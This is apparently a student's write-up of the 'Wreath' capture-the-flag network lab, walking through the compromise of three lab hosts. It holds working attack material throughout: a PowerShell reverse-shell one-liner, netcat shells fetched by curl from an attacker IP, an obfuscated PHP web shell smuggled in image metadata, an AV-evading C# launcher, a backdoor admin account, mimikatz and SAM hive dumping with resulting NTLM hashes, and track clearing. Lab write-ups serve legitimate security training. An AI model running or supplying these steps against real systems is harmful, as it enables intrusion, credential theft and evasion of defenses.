> Wreath

# Information

1. There are three machines on the network
2. There is at least one public facing webserver
3. There is a self-hosted git server somewhere on the network
4. The git server is internal, so Thomas may have pushed sensitive information into it
5. There is a PC running on the network that has antivirus installed, meaning we can hazard a guess that this is likely to be Windows
6. By the sounds of it this is likely to be the server variant of Windows, which might work in our favour
7. The (assumed) Windows PC cannot be accessed directly from the webserver

# Eunmeration

## TARGET 1 - 10.200.114.200

## Nmap full scan

nmap -sC -sV -T4 -Pn -p- -vvv -oN nmap/initial $IP

```
22/tcp    open   ssh        syn-ack      OpenSSH 8.0 (protocol 2.0)
80/tcp    open   http       syn-ack      Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Did not follow redirect to https://thomaswreath.thm
443/tcp   open   ssl/http   syn-ack      Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Thomas Wreath | Developer
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB/localityName=Easingwold/emailAddress=me@thomaswreath.thm
| Issuer: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB/localityName=Easingwold/emailAddress=me@thomaswreath.thm
9090/tcp  closed zeus-admin conn-refused
10000/tcp open   http       syn-ack      MiniServ 1.890 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 5D1CEF08878D3505225DBCCF29774C95
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
15151/tcp closed bo2k       conn-refused
17764/tcp open   tcpwrapped syn-ack
```

## Nmap specific ports and OS scan

sudo nmap -sC -sV -T4 -Pn -O -p 22,80,443,10000 -vvv -oN nmap/specific $IP

```
Aggressive OS guesses: Linux 3.10 - 3.13 (92%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 (86%), Linux 2.6.39 - 3.2 (86%)
```

## Gobuster

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster/initial -u https://$IP -k -x txt,php,sql,js,bin,cgi,zip,tar,bak

```
/img (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
```

We can find that Port 10000 has MinServ 1.890 and we have unauthenticated RCE `cve-2019-15107`. Running the exploit we have a pseudoshell!

**Note:
Bash Ping sweep => for i in {1..255}; do (ping -c 1 10.200.114.${i}) | grep "bytes from" &); done
Port scanning bash => for i in {1..65535}; do (echo > /dev/tcp/<IP>/$i) >/dev/null 2>&1 && echo $i is open; done**

# Git server Enumeration

Let's upload nmap static binary to the box and scan for open ports.

./nmap -sn <IP>

```
Nmap scan report for ip-10-200-114-1.eu-west-1.compute.internal (10.200.114.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00020s latency).
MAC Address: 02:E9:3C:1A:A6:45 (Unknown)
Nmap scan report for ip-10-200-114-100.eu-west-1.compute.internal (10.200.114.100)
Host is up (0.00012s latency).
MAC Address: 02:7D:A8:34:11:BF (Unknown)
Nmap scan report for ip-10-200-114-150.eu-west-1.compute.internal (10.200.114.150)
Host is up (-0.10s latency).
MAC Address: 02:7E:95:08:75:A7 (Unknown)
Nmap scan report for ip-10-200-114-250.eu-west-1.compute.internal (10.200.114.250)
Host is up (0.00016s latency).
MAC Address: 02:BF:2E:91:B4:EF (Unknown)
Nmap scan report for ip-10-200-114-200.eu-west-1.compute.internal (10.200.114.200)
Host is up.
Nmap done: 255 IP addresses (5 hosts up) scanned in 3.73 seconds
```

Looks like 10.200.114.100 and 10.200.114.150 are valid IP and on scanning both we got response from 10.200.114.150.

./nmap-n00bmast3r -vvv 10.200.114.150

```
PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 128
3389/tcp open  ms-wbt-server syn-ack ttl 128
5357/tcp open  wsdapi        syn-ack ttl 128
5985/tcp open  wsman         syn-ack ttl 128
```

## Target 2: 10.200.114.150

We can use sshuttle to pivot.

sshuttle -r root@10.200.114.200 --ssh-cmd "ssh -i id_rsa" 10.200.114.150

And we are in!! Now accessing 10.200.114.150 we can see 3 routes.

1. ^registration/login/$
2. ^gitstack/ => Accesing this gives us a login page and default creds didn't work.
3. ^rest/

Searching in searchsploit we got 3 exploits. As recommended we have to choose the python file. And change the linux line endings using dos2unix tool. => dos2unix ./<file>.py (or) sed -i 's/\r//' ./<file>.py

Chnage the ip to 10.200.114.150 and the command to be executed is whoami. Running the exploit we got response as `nt authority\system`.

And looks like we have uploaded a php exploit and it responds to POST request using parameter a.

curl -X POST http://gitserver.thm/web/exploit.php -d "a=whoami" => also gives us the same output

We have to check if we can connect to others outside the box for reverse shell. Let's try to ping ourselves from the box and verify it using tcpdump.

Looks like we can't. Since this is a CentOS it has a wrapper for firewall `firewalld`. The firewall is extremely restrictive and we have to open a port.

firewall-cmd --zone=public --add-port 12345/tcp

Let's put a powershell reverse shell and capture it in static netcat binary we uploaded in 10.200.144.200. 

## Payload

```
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.114.200',12345);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Let's URL encode it and pass it through curl.
And we have a shell as nt authority\system!!

Let's create our own admin account 

1. net user n00bmast3r 1503 /add
2. net localgroup Administrators n00bmast3r /add
3. net localgroup "Remote Management Users" n00bmast3r /add

Check using the command `net user n00bmast3r`. Now we can login using evil-winrm or xfreerdp.

We can upload mimikatz. For that we have to share our directory (/usr/share/windows-resources) as a shared drive.

`xfreerdp /v:10.200.114.150 /u:n00bmast3r /p:1503 +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share`

Now we have mimikatz and open a cmd as admin. Running mimikatz works.

Let's give ourselves debug privilege. => privilege::debug
And integrity to SYSTEM level => token::elevate

Let's dump SAM local password hashes. => lsadump::sam


We can't crack admin's NTLM Hash but we can crack thomas's. `i<3ruby`. But we can use admin's hash to login uthrough Evil-WinRM. And we have Empire's port scanning script in our working directory and we can load it through Evil-Winrm.

We can set up Listeners, Stagers, Agents. And we have set up a http-hop listener in Starkiller/Empire CLI. now we have 3 files written to /tmp/http-hop. And we need to append it to the webpage. Now let's create a stager `multi/launch` and set teh listeners and copy the payload for future use. Let's zip the files from our attacking machine and send it to Target 1.

We now need to actually serve the files on the port we chose when generating the http_hop listener. Fortunately we already know that this server has PHP installed as it serves as the backend to the main website. This means that we can use the PHP development webserver to serve our files! 

```
php -S 0.0.0.0:PORT &>/dev/null & 
```

Next we can play with modules.

## Target 3: 10.200.114.100

1. evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.114.150 -s .
2. Invoke-Portscan -Hosts 10.200.114.100 -TopPorts 50

```
Hostname      : 10.200.114.100
alive         : True
openPorts     : {80, 3389}
closedPorts   : {}
filteredPorts : {445, 443, 5900, 993...}
finishTime    : 4/6/2021 10:22:20 AM
```

We have to pivot through chisel to access 10.200.114.100. And we have to start chisel server on gitserv and client on own machine. But before that we have to open a port in firewall to forward connection.

`netsh advfirewall firewall add rule name="Chisel-n00bmast3r" dir=in action=allow protocol=tcp localport=47000`

In Target 2, `.\chisel-n00bmast3.exe server -p 47000 --socks5` and our machine `chisel client 10.200.114.150:47000 9090:socks`.

And we can set up Burp Proxy for socks5 127.0.0.1 9090. And accessing `http://10.200.114.100` gives us the same webpage in Target 1.

We know from the brief that Thomas has been using git server to version control his projects -- just because the version on the webserver isn't up to date, doesn't mean that he hasn't been committing to the repo more regularly! In other words, rather than fuzzing the server, we might be able to just download the source code for the site and review it locally.
We can find a git repo in `C:\Gitstack\Repositories\Website.git`. Let's download to it to our local machine and rename it to `.git`. Now using GitTools we can recreate the repository. 

/opt/GitTools/Extractor/extractor.sh . Website

And we have 3 commits inside but we don't have any dates on it. But we can find `commit-meta.txt` file in each commit. Let's see the contents of the file using bash one liner.

separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"

**Note:`\033[4;1m` and `\033[0m` are color codings**

Looking at the commits we can see that they are in reverse order.`2-345ac8b236064b431fa43f53d91c98c4834ef8f3` is the initial commit. And we can search for php file to exploit it.

find . -name "*.php"

```
./resources/index.php
```

Let's try to access /resouces directory in webpage. ANd we are hit with basic auth as expected. We may gues some usernames `Thomas`, `twreath`. And we have already cracked Thomas's password. 

And from the code we analysed in Git repo. we have a particular filter.

```
$size = getimagesize($_FILES["file"]["tmp_name"]); => Checks if file is image file 
if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){ => Separates filename and ext. & stores in list
    header("location: ./?msg=Fail");
    die();
}
```

## Whitelisted extensions

```
$goodExts = ["jpg", "jpeg", "png", "gif"];
```

So, if we enter a file with name `file.jpeg.php` it will be separated as ['file', 'jpeg', 'php'] and `$_FILES["file"]["name"])[1]` asks for 2'nd element and it is jpeg. So it is a valid file type. And getimagesize() function can be bypassed by adding comments as php contents.

# Payload

`exiftool -Comment="<?php echo \"<pre>Test Payload</pre>\"; die(); ?>" test-n00bmast3r.jpg.php`

And we have a valid payload. 

```
	if(isset($_POST["upload"]) && is_uploaded_file($_FILES["file"]["tmp_name"])){
		$target = "uploads/".basename($_FILES["file"]["name"]);
		$goodExts = ["jpg", "jpeg", "png", "gif"];
		if(file_exists($target)){
			header("location: ./?msg=Exists");
			die();
		}
```

From these lines of code we can interfere that the files are uploaded in /uploads adn is stored using the same name as we upload. And accessing `http://10.200.114.100/resources/uploads/test-n00bmast3r.jpg.php` we have executed the payload.

Now we have to obfscate the code.

## Code

```
<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```

Let's put it in a online obfuscation tool and it turns out OK. 

`<?php $p0=$_GET[base64_decode('d3JlYXRo')];if(isset($p0)){echo base64_decode('PHByZT4=').shell_exec($p0).base64_decode('PC9wcmU+');}die();?>`

And now we have to change it so that bash can understand.

`<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>`

And now uploading the file we can get a shell.

`exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" shell-n00bmast3r.jpg.php`

We have a uploaded it successfully. Accessing `http://10.200.114.100/resources/uploads/shell-n00bmast3r.jpg.php?wreath=ipconfig` we can get a valid output!!

We have to clone nc .exe directory from `https://github.com/int0x33/nc.exe/` . 
We want to work under `x86_64-w64-mingw32-gcc` and we have to add it to Makefile. We can compile it and we have `nc.exe`. We can spin up python server and catch it through `certutil.exe` or `curl.exe`. Let's curl it to the machine and get a reverse shell!!

## Uploading nc

http://10.200.114.100/resources/uploads/shell-n00bmast3r.jpg.php?wreath=curl%20http://10.50.115.25:8000/nc.exe%20-o%20c:\\windows\\temp\\nc-n00bmast3r.exe

## Gaining reverse shell

http://10.200.114.100/resources/uploads/shell-n00bmast3r.jpg.php?wreath=powershell.exe%20C:\\Windows\\Temp\\nc-n00bmast3r.exe%2010.50.115.25%20443%20-e%20cmd.exe

# Enumeration - Target 3

whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled  => PrintSpoofer and Potato series of privilege escalation exploits
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288 

Looking for non default services.

wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"


```
System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe  Auto
```

This path doesn't have quotes. The lack of quotation marks around this service path indicates that it might be vulnerable to an Unquoted Service Path attack. In short, if any of the directories in that path contain spaces (which several do) and are writeable (which we are about to check), then -- assuming the service is running as the NT AUTHORITY\SYSTEM account, we might be able to elevate privileges.

## Checking which account service runs

sc qc SystemExplorerHelpService

```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

Let's check the permissions on the directory. If we can write to it, we are golden.

powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"

```
Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\System Explorer
Owner  : BUILTIN\Administrators
Group  : WREATH-PC\None
Access : BUILTIN\Users Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  FullControl
         NT SERVICE\TrustedInstaller Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         BUILTIN\Users Allow  -1610612736
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -1610612736
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
         APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  -1610612736
Audit  : 
Sddl   : O:BAG:S-1-5-21-3963238053-2357614183-4023578609-513D:AI(A;OICI;FA;;;BU)(A;ID;FA;;;S-1-5-80-956008885-341852264
         9-1831038044-1853292631-2271478464)(A;CIIOID;GA;;;S-1-5-80-956008885-3418522649-1831038044-1853292631-22714784
         64)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;
         BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;
         ;;S-1-15-2-2)
```

We have full control over this directory! How strange, but hey, Thomas' security oversight will allow us to root this target.

Now we have to evade the AV and be able to run nc. For this purpose we have to write a wrapper which will evade the AV.

## wrapper.cs

```
using System;
using System.Diagnostics;

namespace Wrapper{
	class Program{
		static void Main(){
			Process proc = new Process();
			ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-n00bmast3r.exe", "10.50.115.25 443 -e cmd.exe");
			procInfo.CreateNoWindow = true;
			proc.StartInfo = procInfo;
			proc.Start();
		}
	}
}
```

mcs wrapper.cs => Compiles the cs file to exe. And now we have wrapper.exe. We can send it by spinning up a python server but we are using impacket to start a SMB server.

**NOTE: Impacket usually uses SMBv1 so we have to mention SMBv2 while using the command**

# Local Machine

1. sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password 1503

# Remote Machine

1. net use \\10.50.115.25\share /USER:user 1503
2. copy \\10.50.115.25\share\Wrapper.exe %TEMP%\wrapper-n00bmast3r.exe
3. net use \\10.50.115.25\share /del => Disconnect
4. "%TEMP%\wrapper-n00bmast3r.exe" => And we have a shell!

# Privilege Escalation

Exploiting unquoted service path!! And this is the vulnerable path. `C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe`

And we have full access to `C:\Program Files (x86)\System Explorer` and now we can add our wrapper here and call it as System.exe.

1. copy %TEMP%\wrapper-USERNAME.exe "C:\Program Files (x86)\System Explorer\System.exe"

Now we can restart the box if we can but unfortunately we can't. So let's restart the service.

2. sc stop SystemExplorerHelpService
3. sc start SystemExplorerHelpService

And we get an error message in remote machine quoting `server didn't respond to start pr control request`. This is because we made it it execute our System.exe. ANd we are in as `nt authority\system`.

## Clearing Tracks

```
del "C:\Program Files (x86)\System Explorer\System.exe"
sc start SystemExplorerHelpService
```

# Exfiltrate Data

We can dump hashes locally in Linux by `cat /etc/shadow`. But fr Windows the hashes are stored in `C:\Windows\System32\Config\SAM`. But they are not readable.

We have to dump SAM hive.

1. reg.exe save HKLM\SAM sam.bak
Dumping the SAM hive isn't quite enough though -- we also need the SYSTEM hive which contains the boot key for the machine
2. reg.exe save HKLM\SYSTEM system.bak

Let's move them to our local machine. 

move sam.bak \\10.50.115.25\share\system.bak
move system.bak \\10.50.115.25\share\system.bak

python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL

```
[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
[*] Cleaning up...
```